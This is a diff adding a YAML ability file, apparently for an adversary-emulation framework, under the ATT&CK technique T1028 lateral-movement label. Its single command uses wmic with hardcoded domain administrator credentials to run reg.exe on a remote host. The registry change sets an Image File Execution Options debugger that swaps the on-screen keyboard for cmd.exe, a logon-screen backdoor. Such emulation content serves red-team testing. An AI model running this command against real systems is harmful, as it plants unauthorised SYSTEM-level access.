@@ -1,0 +1,14 @@
+---
+
+- id: 4b2e9574-b1a7-4b38-95b2-6054ded9T1028-3
+  name: Windows Remote Management - iWMIC Process Call Create
+  description: 
+  tactic: lateral-movement
+  technique:
+    attack_id: T1028
+    name: Window Remote Management
+  platforms:
+    windows:
+      cmd:
+        command: |
+          wmic /user:DOMAIN\Administrator /password:Hqlocal1 /node:CONFICKER process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f"
